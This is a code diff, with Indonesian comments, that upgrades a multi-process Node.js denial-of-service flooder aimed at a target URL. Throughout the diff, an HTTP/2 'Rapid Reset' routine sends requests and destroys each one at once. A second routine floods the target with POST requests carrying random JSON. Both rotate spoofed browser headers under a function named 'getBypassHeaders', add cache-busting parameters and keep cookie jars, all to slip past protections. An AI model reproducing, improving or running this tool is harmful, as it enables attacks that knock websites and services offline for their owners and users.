@@ -1,17 +1,33 @@
 const cluster = require('cluster');
 const os = require('os');
-const http = require('http');
-const https = require('https');
-const http2 = require('http2');
+const http = require('http'); // Diperlukan untuk agent kustom
+const https = require('https'); // Diperlukan untuk agent kustom
+const got = require('got');
+const { CookieJar } = require('tough-cookie');
 const url = require('url');
 const crypto = require('crypto');
 
-const userAgents = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
-];
+const headerPool = {
+    chrome: {
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+        "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": '"Windows"',
+    },
+    firefox: {
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
+    },
+    edge: {
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
+        "sec-ch-ua": '"Chromium";v="124", "Microsoft Edge";v="124", "Not-A.Brand";v="99"',
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": '"Windows"',
+    },
+    safari: {
+        "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
+    }
+};
+const browserChoices = Object.keys(headerPool);
 
 const referers = [
     "https://www.google.com/",
@@ -19,7 +35,33 @@ const referers = [
     "https://www.facebook.com/",
     "https://www.bing.com/",
     "https://www.yahoo.com/",
+    "https://www.duckduckgo.com/",
 ];
+
+const acceptLanguages = [
+    'en-US,en;q=0.9',
+    'en-GB,en;q=0.8',
+    'de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7',
+    'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
+];
+
+function getBypassHeaders() {
+    const browser = browserChoices[Math.floor(Math.random() * browserChoices.length)];
+    const baseHeaders = headerPool[browser];
+
+    const headers = {
+        ...baseHeaders,
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+        'accept-encoding': 'gzip, deflate, br',
+        'accept-language': acceptLanguages[Math.floor(Math.random() * acceptLanguages.length)],
+        'cache-control': 'no-cache',
+        'pragma': 'no-cache',
+        'referer': referers[Math.floor(Math.random() * referers.length)],
+        'upgrade-insecure-requests': '1',
+    };
+
+    return headers;
+}
 
 function generateComplexJsonPayload() {
     const data = {
@@ -43,49 +85,48 @@ function generateComplexJsonPayload() {
     return JSON.stringify(data);
 }
 
+const payloadPool = [];
+for (let i = 0; i < 50; i++) {
+    payloadPool.push(generateComplexJsonPayload());
+}
+const getRandomPayload = () => payloadPool[Math.floor(Math.random() * payloadPool.length)];
+
+
 function executeHttp2Attack(targetUrl, durationSeconds) { // This function runs in the worker process
     const streamsPerLoop = 500;
     let localSent = 0;
     let localError = 0;
     let loopCount = 0;
-    const reportAfterLoops = 100; // Send stats to master every 100 loops (50,000 requests)
+    const reportAfterLoops = 1000; // Send stats to master every 1000 loops (500,000 requests) for accuracy
 
     const target = url.parse(targetUrl);
-    const authority = `${target.protocol}//${target.host}`;
+    const cookieJar = new CookieJar();
 
-    console.log(`Worker ${process.pid} memulai serangan HTTP/2 Rapid Reset ke ${authority} selama ${durationSeconds} detik.`);
-
-    const client = http2.connect(authority);
-    client.on('error', () => {});
-    client.on('socketError', () => {});
+    console.log(`Worker ${process.pid} memulai serangan HTTP/2 Rapid Reset ke ${target.host} selama ${durationSeconds} detik.`);
 
     let isAttackActive = true;
  
     const attack = () => {
-        const headers = {
-            [http2.constants.HTTP2_HEADER_METHOD]: 'GET',
-            [http2.constants.HTTP2_HEADER_PATH]: `${target.path || '/'}${target.path && target.path.includes('?') ? '&' : '?'}_=${crypto.randomBytes(8).toString('hex')}`,
-            [http2.constants.HTTP2_HEADER_SCHEME]: target.protocol.replace(':', ''),
-            [http2.constants.HTTP2_HEADER_AUTHORITY]: target.host,
-            'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
-            'Cache-Control': 'no-cache',
-            'Pragma': 'no-cache',
-            'Referer': referers[Math.floor(Math.random() * referers.length)],
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Accept-Language': 'en-US,en;q=0.9',
-        };
-
-        const stream = client.request(headers);
-        stream.on('error', () => {
-            localError++;
+        const cacheBustingUrl = `${targetUrl}${targetUrl.includes('?') ? '&' : '?'}_=${crypto.randomBytes(8).toString('hex')}`;
+        const request = got(cacheBustingUrl, {
+            http2: true,
+            headers: getBypassHeaders(),
+            timeout: 10000,
+            retry: 0,
+            cookieJar: cookieJar
         });
+
+        request.on('request', (req) => {
+            req.destroy();
+        });
+
         localSent++;
-        stream.destroy();
+        // Error diharapkan terjadi pada serangan rapid reset, jadi tidak dihitung.
+        request.catch(() => {});
     };
  
     const attackLoop = () => {
-        if (isAttackActive && !client.destroyed) {
+        if (isAttackActive) {
             for (let i = 0; i < streamsPerLoop; i++) {
                 attack();
             }
@@ -122,10 +163,7 @@ function executeHttp2Attack(targetUrl, durationSeconds) { // This function runs 
             });
         }
 
-        if (!client.destroyed) {
-            client.destroy();
-        }
-        console.log(`Worker ${process.pid} telah menghentikan serangan ke ${authority}.`);
+        console.log(`Worker ${process.pid} telah menghentikan serangan ke ${target.host}.`);
         process.exit(0);
     }, durationSeconds * 1000);
 }
@@ -135,49 +173,36 @@ function executeLegacyAttack(targetUrl, durationSeconds) {
     let localSent = 0;
     let localError = 0;
     let loopCount = 0;
-    const reportAfterLoops = 125; // Kirim status setiap 400 * 125 = 50,000 request
+    const reportAfterLoops = 1250; // Kirim status setiap 400 * 1250 = 500,000 request untuk akurasi
 
     const target = url.parse(targetUrl);
+    const cookieJar = new CookieJar();
     const protocol = target.protocol === 'https:' ? https : http;
-    const agent = new protocol.Agent({ keepAlive: true, maxSockets: streamsPerLoop + 50 });
+    const agent = {
+        http: new http.Agent({ keepAlive: true, maxSockets: streamsPerLoop + 50 }),
+        https: new https.Agent({ keepAlive: true, maxSockets: streamsPerLoop + 50 }),
+    };
 
     console.log(`Worker ${process.pid} memulai serangan Legacy Flood (Agresif) ke ${targetUrl} selama ${durationSeconds} detik.`);
 
     let isAttackActive = true;
 
     const attack = () => {
-        const payload = generateComplexJsonPayload();
-        const headers = {
-            'Content-Type': 'application/json',
-            'Content-Length': Buffer.byteLength(payload),
-            'Cache-Control': 'no-cache',
-            'Pragma': 'no-cache',
-            'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
-            'Connection': 'keep-alive',
-            'Referer': referers[Math.floor(Math.random() * referers.length)],
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Accept-Language': 'en-US,en;q=0.9',
-        };
-
-        const req = protocol.request({
-            hostname: target.hostname,
-            port: target.port,
-            path: `${target.path || '/'}${target.path && target.path.includes('?') ? '&' : '?'}_=${crypto.randomBytes(8).toString('hex')}`,
-            method: 'POST',
+        const cacheBustingUrl = `${targetUrl}${targetUrl.includes('?') ? '&' : '?'}_=${crypto.randomBytes(8).toString('hex')}`;
+        const payload = getRandomPayload();
+        const headers = getBypassHeaders();
+        
+        localSent++;
+        got.post(cacheBustingUrl, {
             headers: headers,
+            body: payload,
+            timeout: 10000,
+            retry: 0,
             agent: agent,
-        }, (res) => {
-            res.on('data', () => {});
-            res.on('end', () => {});
-        });
-
-        req.on('error', (err) => {
+            cookieJar: cookieJar
+        }).catch((err) => {
             localError++;
         });
-        req.write(payload);
-        req.end();
-        localSent++;
     };
 
     const attackLoop = () => {
